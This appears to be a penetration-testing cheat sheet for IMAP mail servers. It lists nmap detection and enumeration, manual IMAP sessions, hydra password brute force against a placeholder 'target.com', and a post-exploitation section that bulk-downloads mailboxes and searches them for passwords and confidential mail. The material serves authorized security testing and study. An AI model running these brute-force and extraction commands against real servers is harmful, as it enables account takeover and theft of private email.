# Internet Message Access Protocol (IMAP)

## Service Detection

### nmap
```
nmap -p 143,993 -sV target.com
```

## Banner Grabbing

### netcat
```
nc target.com 143
```

### telnet
```
telnet target.com 143
```

### nmap
```
nmap -p 143 -sV target.com
```

## Connect

### telnet (IMAP)
```
telnet target.com 143

# Basic IMAP conversation
a1 LOGIN username password
a2 LIST "" "*"
a3 SELECT INBOX
a4 FETCH 1 BODY[]
a5 LOGOUT
```

### openssl (IMAPS)
```
openssl s_client -connect target.com:993 -crlf -quiet

# IMAP commands
a1 LOGIN username password
a2 LIST "" "*"
a3 LOGOUT
```

### cURL
```
# List mailboxes
curl -u username:password imap://target.com/

# Read specific email
curl -u username:password imap://target.com/INBOX -X "FETCH 1 BODY[]"

# IMAPS
curl -u username:password imaps://target.com/ --insecure
```

## Enumeration 

### Advanced IMAP Enumeration using nmap scripts
```
# Enumerate server capabilities
nmap -p 143 --script imap-capabilities target.com

# Extract NTLM authentication details
nmap -p 143 --script imap-ntlm-info target.com

# Run all IMAP-related scripts
nmap -p 143,993 --script imap-* target.com
```

### Mailbox Enumeration
```
# List all mailboxes
a1 LOGIN username password
a2 LIST "" "*"

# List folders
a3 LIST "" "INBOX.*"

# Check mailbox status
a4 STATUS INBOX (MESSAGES RECENT UNSEEN)

# Select mailbox
a5 SELECT INBOX
```

## Brute Force

### hydra (see also hydra cheatsheet)
```
# IMAP (plaintext)
hydra -l user@target.com -P passwords.txt imap://target.com

# IMAPS (SSL/TLS)
hydra -l user@target.com -P passwords.txt imaps://target.com:993

# Multiple users
hydra -L users.txt -P passwords.txt imap://target.com
```

### nmap
```
nmap -p 143 --script imap-brute target.com
```

## Pass-The-Hash
```
# If NTLM auth is supported
# Connect with NTLM hash instead of password
# Check with:
nmap -p 143 --script imap-ntlm-info target.com
```

## Post-Exploitation

### Email Extraction

#### Read and Search Emails
```
# Read all emails
a1 LOGIN username password
a2 SELECT INBOX
a3 FETCH 1:* (BODY[])

# Search for specific content
a4 SEARCH SUBJECT "password"
a5 SEARCH FROM "admin@target.com"
a6 SEARCH TEXT "confidential"
```

#### Download Emails with cURL
```
for i in {1..100}; do
  curl -u username:password "imap://target.com/INBOX;UID=$i" > email_$i.eml
done
```

### Sensitive Information
#### Search for keywords
```
SEARCH TEXT "password"
SEARCH TEXT "credential"
SEARCH TEXT "confidential"
SEARCH SUBJECT "reset"

# Search by date
SEARCH SINCE 01-Jan-2024

# Combined search
SEARCH FROM "admin" SUBJECT "password"
```

## Common IMAP commands
| Command    | Description         | Usage                          |
|-----------|---------------------|--------------------------------|
| CAPABILITY| List capabilities   | a1 CAPABILITY                  |
| LOGIN     | Authenticate        | a1 LOGIN user pass             |
| LIST      | List mailboxes      | a1 LIST "" "*"                 |
| SELECT    | Select mailbox      | a1 SELECT INBOX                |
| FETCH     | Retrieve messages   | a1 FETCH 1 BODY[]              |
| SEARCH    | Search messages     | a1 SEARCH TEXT "keyword"       |
| STORE     | Modify flags        | a1 STORE 1 +FLAGS \Deleted     |
| LOGOUT    | Close session       | a1 LOGOUT                      |
